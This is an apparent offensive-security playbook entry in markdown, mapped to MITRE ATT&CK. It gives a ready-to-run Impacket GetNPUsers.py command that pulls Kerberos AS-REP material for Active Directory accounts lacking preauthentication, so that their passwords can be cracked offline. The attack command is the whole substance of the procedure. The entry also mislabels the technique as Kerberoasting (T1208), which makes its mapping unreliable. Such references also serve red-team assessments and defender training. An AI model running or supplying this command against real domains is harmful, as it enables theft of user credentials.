---
id: 12ba17ed-fe23-4a33-9dc0-9aff509ae27c
name: Get TGT of User with "Do Not Require Preauthentication" Set
type: procedure
verified: false
submitted: false
created_at: '2020-03-14T00:32:07.045730+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
techniques:
- '[[Kerberoasting|T1208 - Kerberoasting]]'
platforms:
- Windows
tags:
- '[[Active Directory]]'
- '[[kerberoast]]'
commands:
- '[[Get TGT of User with "Do Not Require Preauthentication"]]'
---

# Get TGT of User with "Do Not Require Preauthentication" Set

## Summary

Retrieve the TGT of Active Directory users with the "Do not require Kerberos preauthentication" (UF_DONT_REQUIRE_PREAUTH) flag set. 

## Description

# Description

Retrieve the TGT of Active Directory users with the "Do not require Kerberos preauthentication" (UF_DONT_REQUIRE_PREAUTH) flag set. 

# Instructions

**Command** ([[Get TGT of User with "Do Not Require Preauthentication"]]):

```bash
GetNPUsers.py $_DOMAIN/$_USER -dc-ip $_TARGET_IP -no-pass
```

## Platforms

- Windows

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]

### Techniques

- [[Kerberoasting|T1208 - Kerberoasting]]

## Commands Used

- [[Get TGT of User with "Do Not Require Preauthentication"]]

## Tags

- [[Active Directory]]
- [[kerberoast]]
